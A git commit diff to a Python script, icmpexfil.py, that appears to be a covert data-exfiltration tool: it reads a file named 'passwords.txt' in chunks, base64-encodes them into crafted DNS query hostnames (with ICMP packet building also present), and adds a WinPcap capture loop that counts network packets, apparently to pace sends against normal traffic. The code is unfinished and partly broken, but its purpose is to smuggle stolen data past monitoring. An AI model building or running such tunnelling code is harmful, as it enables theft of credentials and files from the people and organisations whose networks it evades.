50bb4e2e279d36342097e0a4ef1922c5c4afd9e2
Harvey <harvs899@hotmail.co.uk>
2015-07-29 07:53:47 +0100

    Started work on network monitoring

--- icmpexfil.py
+++ icmpexfil.py
@@ -1,12 +1,26 @@
-import struct
-import socket
+import base64
 import binascii
-import random
+import ctypes
 import math
+import platform
+import random
+import socket
+import string
+import struct
+import sys
+import threading
 import time
 
+
+from ctypes import *
+from winpcapy import *
+
+u_short = c_ushort
+u_char = c_ubyte
+u_int = c_int
+
 startByte = 0
-chunkLength = 2
+chunkLength = 20
 exfilBytes = b''
 currentFilePath = "passwords.txt"
 ICMP_ECHO_REQUEST = 8
@@ -50,7 +64,8 @@ class DNSPacket:
         # DNS uses UDP so create UDP header first
 
         packetId = int((id(self) * random.random()) % 65535)
-        udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(40), 0)
+        
+        udpHeader = struct.pack("HHHH", socket.htons(60123), socket.htons(53), socket.htons(8 + 18 + 4*math.ceil(chunkLength/3)), 0)
         dnsHeader = struct.pack("HHHHHH", socket.htons(packetId), 0, socket.htons(1), 0, 0, 0)
         return udpHeader + dnsHeader
 
@@ -87,14 +102,17 @@ def createICMPPacket():
 def createDNSPacket():
     dnsPacket = DNSPacket(0, 0)
     dnsUdpHeader = dnsPacket.getHeader()
-    questionDomain = getNextChunk(startByte, chunkLength)
+    data = getNextChunk(startByte, chunkLength)
+    data = base64.b64encode(data)
+    print(data)
     
-    z = bin(socket.htons(len(questionDomain))).encode() + questionDomain
-    print(bin(len(questionDomain)).encode())
-    
+    # Maximum length of label is 63 characters, so keep chunkLength below this. Unless you seperate into multiple labels
+    queryHostname = len(data).to_bytes(1, "little") + data + (0).to_bytes(1, "big")
+    #print(socket.htons(len(questionDomain)))
+
+    # Add hostname terminating byte and final two options
     end = struct.pack("HH", socket.htons(1), socket.htons(1))
-    
-    return dnsUdpHeader + z + end
+    return dnsUdpHeader + queryHostname + end
 
 def stringToDNSQuery(s):
     labels = s.split(".")
@@ -186,5 +204,193 @@ def sendNext(dest_addr, code, timeout=1):
     #return delay
     return
 
-init()
+
+class ip_address(Structure):
+    _fields_ = [("byte1", u_char),
+                ("byte2", u_char),
+                ("byte3", u_char),
+                ("byte4", u_char)]
+
+
+class ip_header(BigEndianStructure):
+    _fields_ = [("ver_ihl", u_char),
+                ("tos", u_char),
+                ("tlen", u_short),
+                ("identification", u_short),
+                ("flags_fo", u_short),
+                ("ttl", u_char),
+                ("proto", u_char),
+                ("crc", u_short),
+                ("saddr", ip_address),
+                ("daddr", ip_address),
+                ("op_pad", u_int)]
+
+
+class udp_header(BigEndianStructure):
+    _fields_ = [("sport", u_short),
+                ("dport", u_short),
+                ("len", u_short),
+                ("crc", u_short)]
+
+
+pktCount = 0
+intervalTime = 10
+
+
+if platform.python_version()[0] == "3":
+    raw_input=input
+#/* prototype of the packet handler */
+#void packet_handler(u_char *param, const struct pcap_pkthdr *header, const u_char *pkt_data);
+PHAND=CFUNCTYPE(None,POINTER(c_ubyte),POINTER(pcap_pkthdr),POINTER(c_ubyte))
+
+
+def getPacketFrequency():
+    pcap_dispatch() 
+    return
+
+def closePcapLoop(handle):
+    print("Closing pcap loop...")
+    #pktCount = pcap_breakloop()
+    #pcap_close(adhandle)
+    return
+
+capturing = True
+captureLength = 5
+
+def monitorFrequency():
+    global capturing
+    
+    packet_handler=PHAND(_packet_handler)
+    alldevs=POINTER(pcap_if_t)()
+    errbuf= create_string_buffer(PCAP_ERRBUF_SIZE)
+    ## Retrieve the device list
+    if (pcap_findalldevs(byref(alldevs), errbuf) == -1):
+            print ("Error in pcap_findalldevs: %s\n" % errbuf.value)
+            sys.exit(1)
+    ## Print the list
+    i=0
+    try:
+            d=alldevs.contents
+    except:
+            print ("Error in pcap_findalldevs: %s" % errbuf.value)
+            print ("Maybe you need admin privilege?\n")
+            sys.exit(1)
+    while d:
+            i=i+1
+            print("%d. %s" % (i, d.name))
+            if (d.description):
+                    print (" (%s)\n" % (d.description))
+            else:
+                    print (" (No description available)\n")
+            if d.next:
+                    d=d.next.contents
+            else:
+                    d=False
+
+    if (i==0):
+            print ("\nNo interfaces found! Make sure WinPcap is installed.\n")
+            sys.exit(-1)
+    print ("Enter the interface number (1-%d):" % (i))
+    inum= raw_input('--> ')
+    if inum in string.digits:
+            inum=int(inum)
+    else:
+            inum=0
+    if ((inum < 1) | (inum > i)):
+            print ("\nInterface number out of range.\n")
+            ## Free the device list
+            pcap_freealldevs(alldevs)
+            sys.exit(-1)
+    ## Jump to the selected adapter
+    d=alldevs
+    for i in range(0,inum-1):
+            d=d.contents.next
+    ## Open the device 
+    ## Open the adapter
+    d=d.contents
+    adhandle = pcap_open_live(d.name,65536,1,1000,errbuf)
+    if (adhandle == None):
+            print("\nUnable to open the adapter. %s is not supported by Pcap-WinPcap\n" % d.contents.name)
+            ## Free the device list
+            pcap_freealldevs(alldevs)
+            sys.exit(-1)
+    print("\nlistening on %s...\n" % (d.description))
+    ## At this point, we don't need any more the device list. Free it
+    pcap_freealldevs(alldevs)
+    # Start capturing, set large packet capture size because we want to stop before this is reached
+
+    print("Starting capture")
+    start = time.clock()
+    pktCount = 0
+    while(capturing):
+        pcap_dispatch(adhandle, 1, packet_handler, None)
+        pktCount += 1
+        if (time.clock() - start) >= captureLength:
+            break;
+    pcap_close(adhandle)
+    print("Number of packets received in %d seconds: %d" % (captureLength, pktCount)) 
+    return
+
+def stopCapturing():
+    capturing = False
+    return
+
+def main(packet_file):
+    with open(packet_file, "rb") as fd:
+        data = fd.read()
+
+    # create ctypes.c_char_array
+    pkt_data = ctypes.c_buffer(data)
+    packet_handler(pkt_data)
+
+if __name__ == '__main__':
+    if len(sys.argv) == 2:
+        main(sys.argv[1])
+
+def _packet_handler(param,header,pkt_data):
+    global pktCount
+    '''
+    # cast pkt_data to void so we can do some pointer arithmetic
+    v_pkt_data = ctypes.cast(pkt_data, ctypes.c_void_p)
+
+    # retrieve the position of the ip header
+    v_ip_header = ctypes.c_void_p(v_pkt_data.value + 14)
+    pih = ctypes.cast(v_ip_header, ctypes.POINTER(ip_header))
+    ih = pih.contents
+
+    # retrieve the position of the udp header
+    ip_len = (ih.ver_ihl & 0xf) * 4
+    uh = ctypes.cast(ctypes.cast(pih, ctypes.c_void_p).value + ip_len,
+                     ctypes.POINTER(udp_header)).contents
+
+    # convert from network byte order to host byte order
+    sport = socket.ntohs(uh.sport)
+    dport = socket.ntohs(uh.dport)
+
+    print("{}.{}.{}.{}:{} -> {}.{}.{}.{}:{}".format(
+        ih.saddr.byte1, ih.saddr.byte2, ih.saddr.byte3, ih.saddr.byte4, sport,
+        ih.daddr.byte1, ih.daddr.byte2, ih.daddr.byte3, ih.daddr.byte4, dport))
+
+    # Extracting data
+    #
+
+    # data offset from ip header start
+    data_offset = ip_len + ctypes.sizeof(udp_header)
+    # data length
+    data_len = ih.tlen - ip_len - ctypes.sizeof(udp_header)
+    # get data
+    arr_type = (ctypes.c_uint8 * data_len)
+    data = arr_type.from_address(v_ip_header.value + data_offset)
+
+    #print(data[0:data_len])
+
+    # note: same thing could be achieved from pkt_data
+    #print(pkt_data[14+data_offset:14+data_offset+data_len])
+    '''
+    # Record values relating to the packet type
+    pktCount += 1
+    return
+
+#init()
+monitorFrequency()
     
